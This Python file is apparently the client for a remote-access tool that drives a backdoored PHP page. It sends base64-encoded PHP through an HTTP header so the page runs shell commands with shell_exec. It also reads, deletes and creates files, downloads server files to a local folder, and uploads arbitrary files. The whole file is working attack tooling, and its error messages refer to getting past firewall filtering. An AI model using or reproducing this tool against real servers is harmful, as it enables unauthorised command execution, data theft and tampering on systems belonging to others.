from pathlib import Path  # get filename
import base64  # encode commands
import requests  # HTTP requests
from Exceptions import *
from ExploitProcessor import ExploitProcessor

"""
@brief The PHPExploitProcessor class is an abstract class that accepts commands
        passed into it and processes it to be sent to the backdoored PHP page.
        Inherits from the ExploitProcessor class. 
"""
class PHPExploitProcessor(ExploitProcessor):
    def __init__(self, host: str, path: str, method: str, header: str):
        super().__init__(host, path, method, header)

    """
    @brief See base class for details.
    """
    def _Base__version(self, options: str):
        res = self._Base__send_message(f"header('{self.header}: '"
                                       f" . phpversion());"
                                       f"exit;")
        print("PHP Version: " + res)

    """
    @brief See base class for details.
    """
    def _Base__make_connection(self):
        try:
            return self._Base__send_message(f"header('{self.header}: '"
                                            f" . getcwd());"
                                            f"exit;")
        except:
            raise CommandException(f"Unable to exploit host. Make sure the "
                                   f"TARGET_HOST, TARGET_PATH, TARGET_TYPE, "
                                   f"and METHOD are correct.")
    
    """
    @brief See base class for details.
    """
    def _Base__send_message(self, message: str):
        url = f"{self.host}{self.path}"
        if not self.host.startswith("http"):
            url = "http://" + url
        try:
            response = requests.request(
                self.method,
                url,
                headers={ f"{self.header}": message }
            )
            if not response.ok:
                raise Exception()
            if not self.header in response.headers:
                raise CommandException(
                    f"No message sent back from server, your exploit is "
                    f"probably being filtered by a firewall.")
            return response.headers[self.header]
        except:
            raise CommandException(f"Message was not successfully processed.")
        
    """
    @brief Run a command on the target machine, and return its output as a
            string.
    @param command the command to be ran as a string
    @return a string of the output from the server, will be blank if it fails.
    @throw CommandException if there is a connection error.
    """
    def __run(self, command: str):
        encoded = base64.b64encode(command.encode()).decode()
        out = self.__eval(
            f"header('{self.header}: ' . "
            f"base64_encode(shell_exec(base64_decode('{encoded}'))));"
            f"flush();"
        )
        return base64.b64decode(out.encode()).decode()
    
    """
    @brief Run commands to be evaluated as PHP code.
    @param command the command to be ran as a string
    @return any output received from the HTTP header.
    @throw CommandException if there is a connection error.
    """
    def __eval(self, command: str):
        out = self._Base__send_message(
            # f"error_reporting(0);"
            f"chdir('{self.directory}');"
            f"{command}"
            f"exit();")
        return out
    
    """
    @brief Check if a file exists on the server.
    @param name the filename to be checked.
    @return a bool indicating whether or not the file exists.
    @throw CommandException if there is a connection error.
    """
    def __file_exists(self, name: str):
        out = self.__eval(
            f"header('{self.header}: ' . strval(file_exists('{name}')));"
            f"exit();"
        )
        return out == '1'

    """
    @brief See base class for details.
    """
    def _Base__pwd(self, options: str):
        out = self.__eval(
            f"header('{self.header}: ' . "
            f"base64_encode(getcwd()));")
        self.directory = base64.b64decode(out).decode()
        print(self.directory)
    """
    @brief See base class for details.
    """
    def _Base__ls(self, options: str):
        out = self.__eval(
            f"header('{self.header}: ' . "
            f"base64_encode(implode(' ', scandir(getcwd()))));")
        print(base64.b64decode(out).decode())

    """
    @brief See base class for details.
    """
    def _Base__run(self, options: str):
        output = self.__run(options)
        print(output)

    """
    @brief See base class for details.
    """
    def _Base__cd(self, options: str):
        out = self.__eval(f"chdir('{options}');"
                          f"header('{self.header}: ' . "
                          f"base64_encode(getcwd()));")
        self.directory = base64.b64decode(out).decode()
        print(self.directory)

    """
    @brief See base class for details.
    """
    def _Base__cat(self, options: str):
        if len(options) == 0:
            raise CommandException("Specify a file to print.")
        out = self.__eval(
            f"if(!file_exists('{options}')){{"
            f"header('{self.header}: RmlsZSBkb2VzIG5vdCBleGlzdC4=');"
            f"exit();}}"
            f"$f=fopen('{options}','r');"
            f"if(!$f){{ header('{self.header}: Q291bGQgbm90IG9wZW4gZmlsZS4=');"
            f"exit();}}"
            f"header('{self.header}: ' . "
            f"base64_encode(fread($f,filesize('{options}'))));"
            f"fclose($f);"
        )
        print(base64.b64decode(out).decode())

    """
    @brief See base class for details.
    """
    def _Base__download(self, options: str):
        if len(options) == 0:
            raise CommandException("Specify a file to download.")

        url = f"{self.host}{self.path}"
        if not self.host.startswith("http"):
            url = "http://" + url
        try:
            message = (f"chdir('{self.directory}');"
                       f"file_exists('{options}') or exit();"
                       f"header('{self.header}: Done.');"
                       f"header('Content-Length: ' . filesize('{options}'));"
                       f"ob_clean();flush();readfile('{options}');exit();")
            print("Downloading file...")
            response = requests.request(
                self.method,
                url,
                headers={ f"{self.header}": message }
            )
            data = response.content
            if not response.ok:
                raise Exception()
            if not self.header in response.headers:
                raise CommandException(
                    f"No message sent back from server, your exploit is "
                    f"probably being filtered by a firewall.")
            with open('downloads/' + Path(options).name, "wb") as bin_file:
                bin_file.write(data)
            
            print(response.headers[self.header])
        except:
            raise CommandException(f"Could not download file.")
        
    """
    @brief See base class for details.
    """
    def _Base__upload(self, options: str):
        if len(options) == 0:
            raise CommandException("Specify a file to upload.")
        local_file_path = Path(options)
        if not local_file_path.exists():
            raise CommandException("File does not exist.")
        if not local_file_path.is_file():
            raise CommandException("File is not a file.")

        url = f"{self.host}{self.path}"
        if not self.host.startswith("http"):
            url = "http://" + url
        try:
            if (self.__file_exists(local_file_path.name)):
                choice = input("Override existing file? [y/N] ")
                if not choice.lower().startswith('y'):
                    return

            message = (f"chdir('{self.directory}');"
                       f"$ds=fopen('php://input','rb');"
                       f"if($ds && $fp=fopen('{local_file_path.name}','wb')){{"
                       f"while(!feof($ds)){{fwrite($fp,fread($ds,4096));}}"
                       f"}}else{{"
                       f"header('{self.header}: Fail.');exit();"
                       f"}}header('{self.header}: Done.');exit();")
            print("Uploading file...")
            binary = local_file_path.read_bytes()
            
            response = requests.request(
                self.method,
                url,
                headers={ f"{self.header}": message },
                data=binary
            )
            if not response.ok:
                raise Exception()
            if not self.header in response.headers:
                raise CommandException(
                    f"No message sent back from server, your exploit is "
                    f"probably being filtered by a firewall.")
            
            print(response.headers[self.header])
        except:
            raise CommandException(f"Could not upload file.")
        
    def _Base__rm(self, options: str):
        out = self.__eval(f"$out='File does not exist.';"
                          f"if(file_exists('{options}')){{"
                            f"$out='Done.';"
                            f"if(is_dir('{options}')){{"
                                f"if(!rmdir('{options}')){{"
                                    f"$out='Not empty';}}"
                            f"}}else{{if(!unlink('{options}')){{"
                            f"$out='Could not delete';}}}}"
                          f"}}"
                          f"header('{self.header}: ' . "
                          f"$out);")
        print(out)

    def _Base__mkdir(self, options: str):
        out = self.__eval(f"$out='Already exists.';"
                          f"if(!file_exists('{options}')){{"
                            f"$out='Done';"
                            f"if(!mkdir('{options}', 0777, true)){{"
                                f"$out='Failed to make directory.';"
                            f"}}"
                          f"}}"
                          f"header('{self.header}: ' . "
                          f"$out);")
        print(out)

